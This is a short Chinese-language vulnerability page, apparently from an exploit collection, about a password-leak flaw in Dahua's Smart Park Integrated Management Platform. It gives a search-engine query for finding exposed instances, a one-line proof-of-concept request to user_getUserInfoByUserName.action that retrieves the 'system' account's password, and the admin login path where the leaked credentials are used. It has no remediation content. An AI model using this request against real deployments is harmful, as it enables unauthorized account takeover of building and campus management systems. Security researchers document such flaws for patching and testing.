# 大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 账号密码泄漏漏洞

## 漏洞描述

大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 中存在API接口，导致管理园账号密码泄漏

## 漏洞影响

<a-checkbox checked>智慧园区综合管理平台 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="dahua-智慧园区综合管理平台"</a-checkbox></br>

## 漏洞复现

![img](../../../.vuepress/public/img/1645602936890-c40b0210-c98e-465a-b54d-4d5ce28cbdf1-20230814133226060.png)



请求POC

```javascript
/admin/user_getUserInfoByUserName.action?userName=system
```

![img](../../../.vuepress/public/img/1645603053384-cfa58ef1-09bd-41bf-ae36-aac6e71aa639.png)

获取后访问地址 

```javascript
/admin/login_login.action
```

![img](../../../.vuepress/public/img/1647425652303-43761555-6005-4458-96a7-d7990bcaca9b.png)